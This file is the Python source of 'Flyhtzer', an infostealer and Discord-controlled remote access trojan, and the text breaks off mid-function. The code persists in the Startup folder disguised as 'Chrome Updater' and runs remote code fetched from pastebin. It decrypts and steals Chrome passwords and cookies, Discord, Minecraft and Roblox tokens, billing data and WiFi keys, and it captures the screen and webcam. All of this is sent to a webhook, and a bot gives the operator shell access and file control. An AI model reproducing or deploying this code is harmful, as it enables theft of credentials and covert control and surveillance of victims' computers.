#[CREDITS]
#https://github.com/flyhtz
import re
import os
import cv2
import sys
import time
import json
import random
import getmac
import shutil                   
import socket                   
import psutil                   
import base64                   
import ctypes                   
import sqlite3                  
import discord 
import datetime                            
import requests                 
import win32api  
import platform
import win32con                 
import threading                
import subprocess
import win32crypt
import getpass as gp
from time import sleep
from json import loads
import ctypes.wintypes
from ctypes import windll
from PIL import ImageGrab
from Crypto.Cipher import AES
from discord.ext import commands
from dhooks import Webhook, File
from subprocess import Popen, PIPE
from getmac import get_mac_address as gm
from urllib.request import Request, urlopen
from datetime import timezone, datetime, timedelta
from ip2geotools.databases.noncommercial import DbIpCity

# This is version [1.3] of Flyhtzer! Here's some switches, settings & an overview of the programs base/structure:

# Switches (True/False) # These are options that can be turned ON/OFF to change the programs behaviour     #    [#]   <DEV STAGE>      #

runrat        = True    # Starts the RAT Bot with the specified bot token [COMPLETE RCE]                   #    [+]  FULLY WORKING     #
add2startup   = True    # Adds this file to the victims startup folder (opens when they start the pc)      #    [+]  FULLY WORKING     #
logminecraft  = False   # Logs victims Minecraft accounts [IDS, EMAILS, TOKENS]                            #    [+]  FULLY WORKING     #
add2database  = False   # Saves users information to a custom MongoDB database [username,token,ip]         #    [+]  FULLY WORKING     #
scrapepc      = True    # Scrapes EVERYTHING on the PC, Firewalls, AV's, Ports, Network, DNS & More        #    [+]  FULLY WORKING     #
discordinject = False   # Injects custom code into Discord client to do whatever you want                  #    [+]  FULLY WORKING     # 
custompayload = False   # Allows you to execute custom code from a pastebin script on startup              #    [+]  FULLY WORKING     #
hidewindow    = True    # Turns window/console off when program is opened                                  #    [+]  FULLY WORKING     #                   NO CURRENT ISSUES IN 4.0!
logroblox     = False   # Grabs the victims roblox.com cookies                                             #    [?]  NEEDS TESTING     #
sendnetwork   = True    # Scrape the users local network [MAC'S, IP'S]                                     #    [+]  FULLY WORKING     #
camerapic     = True    # Get a picture from the victims camera/webcam (if they have one)                  #    [+]  FULLY WORKING     #
sendhistory   = False   # Sends the victims Chrome browser history (takes a while)                         #    [+]  FULLY WORKING     #
takess        = True    # Sends a screenshot of the users screen                                           #    [+]  FULLY WORKING     #
getcookies    = False   # Allow the program to try and grab the victims Chrome cookies                     #    [?]  NEEDS TESTING     #
sendlogin     = True    # Sends a JavaScript Script to login to Discord with the token                     #    [+]  FULLY WORKING     #
# Settings              # These are customizable settings which modify the programs style or switches
black  = 0x000000                                                                                          #                           #
white  = 0xffffff        #######################################                                           #   This setting changes:   #
red    = 0xff1100        #                                     #                                           #     Flyhzter Embeds       #
green  = 0x00ff00        #   Variables for selectable colors   #                                           #      (RAT & Logging)      #
blue   = 0x0000ff        #                                     #                                           #   to your chosen color.   #
pink   = 0xff00ee        #######################################                                           #                           #
yellow = 0xfffb00                                                            

embedcolor = red      # Colors Available: - [black] [white] [red] [blue] [pink] [yellow] [green]           #    [+]  FULLY WORKING     #

payloadurl = "yourcode"  # Use end-of-url code from pastebin code link (ex. pastebin.com/yourcode)         #     [+]  FULLY WORKING    # [INFO]: SCRIPT MUST BE IN PYTHON

injecturl  = "yourcode"  # Use end-of-url code from pastebin code link (ex. pastebin.com/yourcode)         #     [+]  FULLY WORKING    # [INFO]: SCRIPT MUST BE IN JAVASCRIPT AND [webhook = "%webhook%"]

fakename   = "Chrome Updater" # Changes fake file name if added to startup (this shows in task manager too)#    [+]  FULLY WORKING     #

## MongoDB connection url
mongodburl = ""
## If using db log, create a collection called victims within victimlogs inside your cluster                                            

# Starting Functions
myname = str(sys.argv[0])
if ".py" in myname:
    extension = ".py"
else:
    extension = ".exe"

if hidewindow:
    # The functions here that are being switched to false have a tendency to produce errors when the terminal is hidden
    sendhistory   = False 
    getcookies    = False 
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

if hasattr(sys, 'real_prefix'): # Detect if user is on VM [Debug/Bypassing program]
    print("VM Detected!")
    exit()

# [PLEASE ENABLE hidewindow WHEN ADDING TO STARTUP TO ENSURE THE VICTIMS DOESN'T NOTICE IT]
def startup(): 
    try:
        shutil.copy2(myname, fr'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{fakename}{extension}' % gp.getuser())
        
    except:
        pass

if add2startup:
    startup()

if custompayload:                                                                         
    payloadtext = requests.get(f'https://pastebin.com/raw/{payloadurl}')                  
    exec(payloadtext.text)   

def fiddlercheck():                                                                           
    for proc in psutil.process_iter():                                                        
        if proc.name() == "Fiddler.exe":                                                      
            proc.kill()                                                                       
threading.Thread(target=fiddlercheck).start() 

def typetext(message):                                                                        
    titletext = ''                                                                            
    for char in message: titletext += char;os.system(f'title {titletext}');time.sleep(0.018)  
typetext('Program • Starting Loader...')                                                            

os.system('mode con: cols=90 lines=20')                                                                                                                                                                                                                
################################################################################################

# Flyhtzer Main 
class Hook:
    def GetHOOK():
        # You can add your own webhook encryption here if you need
        webhook = "YOUR-WEBHOOK-HERE"
        return webhook

    def SendHOOK(data):
        response = requests.post(Hook.GetHOOK(), json=data)

class Logging:

    class Minecraft:
        def GetLocations():
            if os.name == 'nt':
                accountlocations = [
                    f'C:\\Users\\{gp.getuser()}\\AppData\\Roaming\\.minecraft\\launcher_accounts.json',
                    f'C:\\Users\\{gp.getuser()}\\AppData\\Roaming\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
                ]
                
            else:
                accountlocations = [
                    f'\\home\\{gp.getuser()}\\.minecraft\\launcher_accounts.json',
                    f'\\sdcard\\games\\com.mojang\\',
                    f'\\~\\Library\\Application Support\\minecraft'
                    f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
                ]

            return accountlocations

        def MinecraftStealer():
            accounts = []
            for location in Logging.Minecraft.GetLocations():
                if os.path.exists(location):
                    auth_db = json.loads(open(location).read())['accounts']

                    for d in auth_db:
                        sessionKey = auth_db[d].get('accessToken')
                        if sessionKey == "":
                            sessionKey = "None"
                        username = auth_db[d].get('minecraftProfile')['name']
                        sessionType = auth_db[d].get('type')
                        email = auth_db[d].get('username')
                        if sessionKey != None or '':
                            accounts.append("Username: " + username + ", Session: " + sessionType + ", Email: " + email + ", Token: " + sessionKey)

            if accounts == []:
                accounts = "No Minecraft Accounts Found"

            return accounts


    class Passwords:
        def EncryptionKey():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
                    "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        def DecryptPass(password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""

        # Access local Chrome.db file and access table with EncryptionKey() ; write data to file and call webhook function
        def PasswordStealer():
            f = open('C:\ProgramData\chrome.txt', 'a+', encoding="utf-8")
            key = Logging.Passwords.EncryptionKey()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            f.write(f"PASSWORDS FOUND!\n")
            for row in cursor.fetchall():
                origin_url = row[0] 
                action_url = row[1]
                username = row[2]
                password = Logging.Passwords.DecryptPass(row[3], key)
                date_created = row[4]
                date_last_used = row[5]        
                if username or password:
                    f.write("─────────────────────────[TROLL]─────────────────────────\n \nUSER:: %s \nPASS:: %s \nFROM:: %s \n \n" % (username, password, origin_url))
                else:
                    continue
            f.close()
            Logging.System.FetchFiles()
            cursor.close()
            db.close()
            try:
                os.remove(filename)
            except:
                pass

    class Discord():

        # Inject javascript code into Discord's local files to detect account changes (change email, password, add card, etc.)
        def InjectionMain():
            for proc in psutil.process_iter():
                if any(procstr in proc.name() for procstr in\
                ['discord', 'Discord', 'DISCORD',]):
                    proc.kill()
            for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
                for name in dirs:
                    if (name.__contains__("discord_desktop_core-")):
                        try:
                            directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                            try:
                                os.rmdir(os.path.join(root, name+"\\discord_desktop_core\\Troll"))
                            except:
                                pass
                            os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Troll"))
                            f = urlopen(f'https://pastebin.com/raw/{payloadurl}')  # Use 'injecturl in Settings to change your injection code
                            index_content = f.read()
                            with open(directory_list, 'wb') as index_file:
                                index_file.write(index_content)
                            with open(directory_list, 'r+') as index_file2:
                                replace_string = index_file2.read().replace("%webhook%", Hook.GetHOOK())
                            with open(directory_list, 'w'): pass
                            with open(directory_list, 'r+') as index_file3:
                                index_file3.write(replace_string)
                        except FileNotFoundError:
                            pass

            for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
                for name in files:
                    discord_file = os.path.join(root, name)
                    os.startfile(discord_file)

        def TokenSearch(path): 
            path += '\\Local Storage\\leveldb'
            tokens = []
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            if token not in tokens:
                                tokens.append(token)
            return tokens

        def UserData(token):
            try:
                return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=Logging.Discord.GetHeaders(token))).read().decode())
            except:
                pass

        def ConstructLogin(token):
            return '''
function login(token) {
setInterval(() => {
document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
}, 50);
setTimeout(() => {
location.reload();
}, 2500);
}
login("''' + token + '''")'''

        def GetHeaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers

        def GetBilling(token):
            response = requests.get(f'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Logging.Discord.GetHeaders(token))
            billingmail = response.json()[0]['email']
            billingname = response.json()[0]['billing_address']['name']
            address_1 = response.json()[0]['billing_address']['line_1']
            address_2 = response.json()[0]['billing_address']['line_2']
            city = response.json()[0]['billing_address']['city']
            state = response.json()[0]['billing_address']['state']
            postal = response.json()[0]['billing_address']['postal_code']
            try:
                return f"""Name: {billingname}
Email: {billingmail}
Address: {address_1}, {address_2}
City/State: {city} / {state}
Postal Code: {postal}"""
            except:
                return 'No Billing info'

        def PaymentCheck(token):
            try:
                return bool(requests.get(f'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Logging.Discord.GetHeaders(token)))
            except:
                pass

        

    class System:
        # Create & close socket connection to detect host of socket [doesn't need to connect]
        def GetLocalIP():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('10.255.255.255', 1))
            localip = s.getsockname()[0]
            s.close()
            return localip

        def GetHistory():
            history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
            login_db = os.path.join(history_path, 'History')
            shutil.copyfile(login_db, "C:\ProgramData\histdb.db")
            c = sqlite3.connect("C:\ProgramData\histdb.db")
            cursor = c.cursor()
            select_statement = "SELECT title, url FROM urls"
            cursor.execute(select_statement)
            history = cursor.fetchall()
            with open('C:\ProgramData\history.txt', "w+", encoding="utf-8") as f:
                f.write('HISTORY LOGGED!' + '\n' + '─────────────────────[TROLL]─────────────────────' + '\n' + '\n')
                for title, url in history:
                    f.write(f"Title: {str(title.encode('unicode-escape').decode('utf-8')).strip()}\nURL: {str(url.encode('unicode-escape').decode('utf-8')).strip()}" + "\n" + "\n" + "─────────────────────[TROLL]─────────────────────"+ "\n" + "\n")
                f.close()
            c.close()
            os.remove("C:\ProgramData\histdb.db")
            historyfile = File('C:\ProgramData\history.txt', name='History.txt')
            fileurl = Webhook(Hook.GetHOOK())
            fileurl.send(file=historyfile)
            os.remove('C:\ProgramData\history.txt')

        def TakeScreenshot():
            screenshot = ImageGrab.grab()
            screenshot.save("C:\ProgramData\Desktop.jpg")
            screenfile = File('C:\ProgramData\Desktop.jpg', name='Desktop.jpg')
            fileurl = Webhook(Hook.GetHOOK())
            fileurl.send(file=screenfile)
            os.remove('C:\ProgramData\Desktop.jpg')

        def ScrapeWindows():
            f = open("C:\ProgramData\scrapepc.txt", "w+", encoding="utf-8")
            scrapecmds={
                "Current User":"whoami /all",
                "Local Network":"ipconfig /all",
                "FireWall Config":"netsh firewall show config",
                "Online Users":"quser",
                "Local Users":"net user",
                "Admin Users": "net localgroup administrators",
                "Anti-Virus Programs":r"WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe",
                "Port Information":"netstat -ano",
                "Routing Information":"route print",
                "Hosts":"type c:\Windows\system32\drivers\etc\hosts",
                "WIFI Networks":"netsh wlan show profile",
                "Startups":"wmic startup get command, caption",
                "DNS Records":"ipconfig /displaydns",
                "User Group Information":"net localgroup",
            }   
            for key,value in scrapecmds.items():
                f.write('\n─────────────────────[%s]─────────────────────'%key)
                cmd_output = os.popen(value).read()
                f.write(cmd_output)
            f.close()
            scrapewin_file = File('C:\ProgramData\scrapepc.txt', name='PC Scrape.txt')
            fileurl = Webhook(Hook.GetHOOK())
            fileurl.send(file=scrapewin_file)
            os.remove('C:\ProgramData\scrapepc.txt')

        def GetWiFi():
            wifidata = []
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for i in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        wifidata.append('{:} - {:}'.format(i, results[0]))
                    except IndexError:
                        wifidata.append('{:} - {:}'.format(i, "No Password"))
                except subprocess.CalledProcessError:
                    wifidata.append('{:} - {:}'.format(i, "ENCODING ERROR"))
            return wifidata

        if logroblox:
            try:
                import browser_cookie3 # This module is really buggy I don't really suggest using it!
                f = open('C://ProgramData//robloxcookies.txt', "w+", encoding="utf-8")
                f.write('─────────────────────[TROLL]─────────────────────\n')
                robloxcookies_found = False
                try:
                    cookies = browser_cookie3.edge(domain_name='roblox.com')
                    cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                    f.write(f"Edge: {cookie}")
                    robloxcookies_found = True
                except:
                    pass
                try:
                    cookies = browser_cookie3.chrome(domain_name='roblox.com')
                    cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                    f.write(f"Chrome: {cookie}")
                    robloxcookies_found = True
                except:
                    pass
                try:
                    cookies = browser_cookie3.firefox(domain_name='roblox.com')
                    cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                    f.write(f"Firefox: {cookie}")
                    robloxcookies_found = True
                except:
                    pass
                try:
                    cookies = browser_cookie3.opera(domain_name='roblox.com')
                    cookie = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
                    f.write(f"Opera: {cookie}")
                    robloxcookies_found = True
                except:
                    pass

                if robloxcookies_found == False:
                    f.write("No Roblox Cookies Found!")

                robloxfile = File('C://ProgramData//robloxcookies.txt', name='robloxcookies.txt')
                fileurl = Webhook(Hook.GetHOOK())
                fileurl.send(file=robloxfile)
                os.remove('C://ProgramData//robloxcookies.txt')
            except:
                pass


        def GetCamera():
            try:
                camera = cv2.VideoCapture(0)
                return_value,image = camera.read()
                gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
                cv2.imwrite(f'C:\ProgramData\camera.jpg',image)
                camera.release()
                cv2.destroyAllWindows()
                camerafile = File('C:\ProgramData\camera.jpg', name='Camera.jpg')
                fileurl = Webhook(Hook.GetHOOK())
                fileurl.send(file=camerafile)
                os.remove('C:\ProgramData\camera.jpg')
            except:
                photo_data = "No Camera Detected"


        def FetchFiles():
            victimpass = File('C:\ProgramData\chrome.txt', name='Passwords.txt')
            fileurl = Webhook(Hook.GetHOOK())
            fileurl.send(file=victimpass)
            os.remove('C:\ProgramData\chrome.txt')

            if getcookies:
                master_key = Logging.Passwords.EncryptionKey()
                f = open("C:\ProgramData\cookies.txt", "w+", encoding="utf-8")
                local = os.getenv('LOCALAPPDATA')
                login_db = local+'\\Google\\Chrome\\User Data\\default\\cookies'
                try:
                    shutil.copy2(login_db, "Loginvault.db")
                except:
                    pass
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                    f.write("COOKIES FOUND!")
                    cookiesfound = True
                    for r in cursor.fetchall():
                        Host = r[0]
                        user = r[1]
                        encrypted_cookie = r[2]
                        decrypted_cookie = Logging.Passwords.DecryptPass(encrypted_cookie, master_key)
                        if Host != "":
                            f.write(f"─────────────────────────[TROLL]─────────────────────────\n \nURL:: {Host}\nUSER:: {user}\nCOOKIE:: {decrypted_cookie} \n \n")
                except:
                    cookiesfound = False
                cursor.close()
                conn.close()
                f.close()
                try:
                    os.remove("Loginvault.db")
                except:
                    pass

                if cookiesfound:
                    victimcookie = File('C:\ProgramData\cookies.txt', name='Cookies.txt')
                    fileurl = Webhook(Hook.GetHOOK())
                    fileurl.send(file=victimcookie)
                    os.remove("C:\ProgramData\cookies.txt")

            if sendhistory:
                Logging.System.GetHistory()

            if sendnetwork:
                os.system('arp -a > C:\ProgramData\localnetwork.txt')
                victimnet = File('C:\ProgramData\localnetwork.txt', name='Network.txt')
                fileurl = Webhook(Hook.GetHOOK())
                fileurl.send(file=victimnet)
                os.remove('C:\ProgramData\localnetwork.txt')

            if scrapepc:
                Logging.System.ScrapeWindows()

            if takess:
                Logging.System.TakeScreenshot()

            if camerapic:
                Logging.System.GetCamera()
			

        def GetHWID():
            cmd = 'wmic csproduct get uuid'
            uuid = os.popen(cmd).read()
            pos1 = uuid.find("\n")+2
            uuid = uuid[pos1:-1]
            return uuid.rstrip()

        def GetIP():
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            return ip

        def GetWINKey():
            p = Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
            winkey = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
            return winkey

        def FetchComputer():
            ###INFO###
            uname = platform.uname()
            version = uname.version
            processor = platform.processor()
            pcuser = os.getenv("UserName")
            desktopname = os.getenv("COMPUTERNAME")
            boottime = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            hwid = Logging.System.GetHWID()
            localip = Logging.System.GetLocalIP()
            macaddress = gm(ip=localip)
            winkey = Logging.System.GetWINKey()

            ###IP###   
            ip = Logging.System.GetIP()
            ipdata = DbIpCity.get(ip, api_key='free')
            ipcountry =  ipdata.country
            ipcity = ipdata.city
            iplatlong = f"{ipdata.latitude}/{ipdata.longitude}" 
            arp = os.popen('dir').read()

            ###RAM/CPU/GPU###
            totalram = f"{round(psutil.virtual_memory().total/1000000000, 2)}GB"
            availableram = f"{round(psutil.virtual_memory().available/1000000000, 2)}GB"
            ramused = f"{round(psutil.virtual_memory().used/1000000000, 2)}GB"
            ramusage = f"{psutil.virtual_memory().percent}%"

            cpucount = psutil.cpu_count(logical=False)
            try:
                p = Popen("wmic path win32_VideoController get name", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) 
                gpu = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
            except:
                gpu = "None"
                
            embed = {
                "content": "",
                "embeds": [
                    {
                        "title": "Computer Information",
                        "description": "Information about the Victims PC",
                        "color": embedcolor,
                        "fields": [
                            {
                                "name": "Basic Information",
                                "value": f"```Username: {pcuser}\nPC Name: {desktopname}\nBootTime: {boottime}\nOS Version: {version}\nHWID: {hwid}\nWindows Activation Key: {winkey}```",
                                "inline": True
                            },
                            {
                                "name": f"WiFi Passwords",
                                "value": f"```{Logging.System.GetWiFi()}```",
                                "inline": False
                            },
                            {
                                "name": f"Minecraft Accounts",
                                "value": f"```{Logging.Minecraft.MinecraftStealer()}```",
                                "inline": False
                            },
                            {
                                "name": "RAM",
                                "value": f"```Total: {totalram}\nAvailable: {availableram}\nUsed: {ramused}\nUsage: {ramusage}```",
                                "inline": True
                            },
                            {
                                "name": "Miscellaneous",
                                "value": f"```CPU Cores: {cpucount}\n{gpu}\nLocal IP: {localip}\nMAC: {macaddress}```",
                                "inline": True
                            },
                            {
                                "name": "IP Information",
                                "value": f"```IP: {ip}\nCountry: {ipcountry}\nCity: {ipcity}\nCoords: {iplatlong}```",
                                "inline": False
                            }
                        ],
                        "footer": {
                            "text": "Flyhtzer | github.com/Flyhtz",
                        }
                    },
                ]
            }
            Hook.SendHOOK(embed)


    class RAT():

        def MonitorOFF():
            WM_SYSCOMMAND = 274
            HWND_BROADCAST = 65535
            SC_MONITORPOWER = 61808
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)

        def MonitorON():
            WM_SYSCOMMAND = 274
            HWND_BROADCAST = 65535
            SC_MONITORPOWER = 61808
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)

        def StartRAT():
            ## RAT BOT VARIABLES ##
            client = commands.Bot(command_prefix=">")
            BotToken = 'YOUR-BOT-TOKEN-HERE' # RAT Bot Token
            ip = Logging.System.GetIP()
            pcname = os.getenv("COMPUTERNAME")

            ### Menu & SubMenu's###
            @client.command()
            async def menu(ctx):
                embed = discord.Embed(title = f"{pcname} @ {ip}", color=embedcolor)
                embed.add_field(name = ">shell :dart:", value = "RCE and control files",  inline= False)
                embed.add_field(name = ">spying :camera:", value = "Spy and change windows customization",  inline= False)
                embed.add_field(name = ">system :knife:", value = "Gather information on the PC",  inline= False)
                embed.add_field(name = ">admin :lock:", value = "Commands which require admin permissions",  inline= False)
                embed.add_field(name = ">misc :man_shrugging:", value = "Miscellaneous Commands",  inline= False)
                embed.add_field(name = ">Flyhtzer :money_mouth:", value = "Extra commands",  inline= False)
                await ctx.send(embed = embed)

            @client.command()
            async def shell(ctx):
                embed = discord.Embed(title = "Shell Commands :dart:", color=embedcolor)
                embed.add_field(name = ">cmd <command> <embed/file>", value = "Executes Custom Command ~ outputs as (embed/file)",  inline= False)
                embed.add_field(name = ">download <file>", value = "Downloads File from Victims PC",  inline= False)
                embed.add_field(name = ">upload <attachment> <filename>", value = "Upload File to TEMP Directory",  inline= False)
                embed.add_field(name = ">read <file> <embed/file>", value = "Sends File Content ~ outputs as (embed/file)",  inline= False)
                embed.add_field(name = ">delete <file>", value = "Removes File from Victims PC",  inline= False)
                embed.add_field(name = ">endtask <taskname>", value = "Ends a Custom Process",  inline= False)
                await ctx.send(embed = embed)

            @client.command()
            async def spying(ctx):			
                embed = discord.Embed(title = "Surveillance Commands :camera:", color=embedcolor)
                embed.add_field(name = ">monitoroff", value = "Turns off Monitor",  inline= False)
                embed.add_field(name = ">monitoron", value = "Turns on Monitor",  inline= False)
                embed.add_field(name = ">screenshot", value = "Sends Victims Screen",  inline= False)
                embed.add_field(name = ">camera", value = "Sends Picture through Camera",  inline= False)
                await ctx.send(embed = embed)

            @client.command()
            async def system(ctx):
                embed = discord.Embed(title = "System Commands :knife:", color=embedcolor)
                embed.add_field(name = ">scrapecomputer", value = "Sends full PC Scrape",  inline= False)
                embed.add_field(name = ">systeminfo", value = "Sends SystemInfo",  inline= False)
                embed.add_field(name = ">drivers", value = "Sends Driver Info",  inline= False)
                embed.add_field(name = ">tasks", value = "Sends Running Processes",  inline= False)
                await ctx.send(embed = embed)

            @client.command()
            async def admin(ctx):
                embed = discord.Embed(title = "Admin Commands :lock:", color=embedcolor)
                embed.add_field(name = ">blockinput", value = "Blocks Keyboard and Mouse input",  inline= False)
                embed.add_field(name = ">unblockinput", value = "Unblocks Keyboard and Mouse input",  inline= False)
                embed.add_field(name = ">criticalproc", value = "Makes process bluescreen if closed",  inline= False)
                await ctx.send(embed = embed)

            @client.command()
            async def misc(ctx):
                embed = discord.Embed(title = "Miscellaneous Commands :man_shrugging:", color=embedcolor)
                embed.add_field(name = ">admincheck", value = "Checks File Admin Privileges",  inline= False)			
                embed.add_field(name = ">setwallpaper <attachment>", value = "Sets Victims Wallpaper to your Attachment",  inline= False)
                embed.add_field(name = ">saymessage <message>", value = "Voices message on Victims machine",  inline= False)
                embed.add_field(name = ">messagebox <message>", value = "Shows a custom MessageBox",  inline= False)        
                await ctx.send(embed = embed)

            @client.command()
            async def Flyhtzer(ctx):
                embed = discord.Embed(title = "Flyhtzer :clown:", color=embedcolor)
                embed.add_field(name = ">showdb", value = "Display your Flyhtzer Database",  inline= False)
                embed.add_field(name = ">cleardb", value = "Clear your Flyhtzer Database",  inline= False)
                embed.add_field(name = ">switches", value = "Display Switch Values",  inline= False)
                embed.add_field(name = ">credits", value = "Credits for Flyhtzer",  inline= False)
                await ctx.send(embed = embed)

            # Functionality of menu commands ##
         
            @client.command()
            async def monitoroff(ctx):
                Logging.RAT.MonitorOFF()
                embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                embed.add_field(name = ">monitoron", value = "```Monitor Turned off Successfully```",  inline=False)
                await ctx.send(embed = embed)

            @client.command()
            async def monitoron(ctx):
                Logging.RAT.MonitorON()
                embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                embed.add_field(name = ">monitoron", value = "```Monitor Turned off Successfully```",  inline=False)
                await ctx.send(embed = embed)

            @client.command()
            async def tasks(ctx):
                taskdata = os.popen('tasklist').read()
                os.system('echo tasklist > C:\\ProgramData\\taskdata.txt')
                f = open("C:\\ProgramData\\taskdata.txt", "w")
                f.write(taskdata)
                f.close()
                embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                embed.add_field(name = ">tasks", value = "```Tasks Logged Successfully```",  inline=False)
                await ctx.send(embed = embed)
                await ctx.send(file=discord.File(r'C:\\ProgramData\\taskdata.txt'))
                os.remove('C:\\ProgramData\\taskdata.txt')

            @client.command()
            async def showdb(ctx):
                embed = discord.Embed(title = f"Flyhtzer Database", color=embedcolor)
                try:
                    import pymongo
                    databaseurl = mongodburl
                    myclient = pymongo.MongoClient(databaseurl)
                    mydb = myclient["victimlog"]
                    mycol = mydb["victims"]
                    database_accounts = []
                    for doc in mycol.find():
                        database_accounts.append(doc)
                    if database_accounts == []:
                        embed.add_field(name = "Search Error", value = f"```No Accounts in the database!```", inline=False)
                    elif database_accounts != []:
                        num = 0
                        for account_found in database_accounts:
                            embed.add_field(name = f"Account Found [{num+1}]", value = f"```{database_accounts[num]}```", inline=False)
                            num = num + 1
                except Exception as e:
                    embed = discord.Embed(title = "Flyhtzer Error", color=embedcolor)
                    embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                await ctx.send(embed = embed)

            @client.command()
            async def cleardb(ctx):
                try:
                    import pymongo
                    databaseurl = mongodburl
                    myclient = pymongo.MongoClient(databaseurl)
                    mydb = myclient["victimlog"]
                    mycol = mydb["victims"]
                    logs_deleted = 0
                    for doc in mycol.find():
                        mycol.delete_one(doc)
                        logs_deleted = logs_deleted + 1
                    embed = discord.Embed(title = f"Flyhtzer Database", color=embedcolor)
                    embed.add_field(name = "Database Cleared!", value = f"```{logs_deleted} Logs Deleted!```",  inline=False)
                except Exception as e:
                    embed = discord.Embed(title = "Flyhtzer Error", color=embedcolor)
                    embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)

                await ctx.send(embed = embed)

            @client.command()
            async def switches(ctx):
                embed = discord.Embed(title = f"Flyhtzer Switches", color=embedcolor)
                embed.add_field(name = "Switches (True/False)", value = f"```runrat:        {runrat}\nadd2startup:   {add2startup}\nlogminecraft:  {logminecraft}\nscrapepc:      {scrapepc}\ndiscordinject: {discordinject}\ncustompayload: {custompayload}\nhidewindow:    {hidewindow}\nlogroblox:     {logroblox}\nsendnetwork:   {sendnetwork}\ncamerapic:     {camerapic}\nsendhistory:   {sendhistory}\ntakess:        {takess}\ngetcookies:    {getcookies}\nsendlogin:     {sendlogin}```",  inline=False)
                await ctx.send(embed = embed)

            @client.command()
            async def credits(ctx):
                embed = discord.Embed(title = f"Flyhtzer Credits", color=embedcolor)
                embed.add_field(name = "Github", value = f"**https://github.com/flyhtz**\n**https://github.com/flyhtz**",  inline=False)
                embed.add_field(name = "Discord", value = f"**https://discord.com/users/523872677686018088**",  inline=False)
                await ctx.send(embed = embed)                 

            @client.command()
            async def camera(ctx):
                try:
                    camera = cv2.VideoCapture(0)
                    return_value,image = camera.read()
                    gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
                    cv2.imwrite(f'C:\ProgramData\Camera.jpg',image)
                    camera.release()
                    cv2.destroyAllWindows()
                    await ctx.send(file=discord.File(fr'C:\ProgramData\Camera.jpg'))
                    os.remove('C:\ProgramData\Camera.jpg')
                except:
